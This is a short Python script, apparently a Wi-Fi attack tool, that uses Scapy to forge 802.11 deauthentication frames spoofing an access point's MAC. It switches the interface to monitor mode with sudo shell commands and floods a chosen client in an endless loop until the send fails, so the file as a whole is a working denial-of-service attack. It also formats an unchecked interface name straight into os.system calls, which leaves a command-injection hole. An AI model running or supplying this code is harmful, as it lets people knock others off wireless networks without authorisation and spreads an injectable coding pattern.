from scapy.layers.dot11 import RadioTap, Dot11, Dot11Deauth
from scapy.sendrecv import *
import os,sys

class scapy_scapy:


    def deauth(self, mac, target_mac, iface):
        mac = str(mac)
        target_mac = str(target_mac)
        pkt  = RadioTap() / Dot11(addr1 =  target_mac, addr2 = mac , addr3 = mac) / Dot11Deauth(reason = 2 )

        os.system('sudo ifconfig %s down'%(iface))
        os.system('sudo iwconfig %s mode monitor'%(iface))
        os.system('sudo ifconfig %s up'%(iface))
        while True:
            try:
                sendp(pkt, iface = iface , verbose = False)
            except:
                print("Client down")
                break
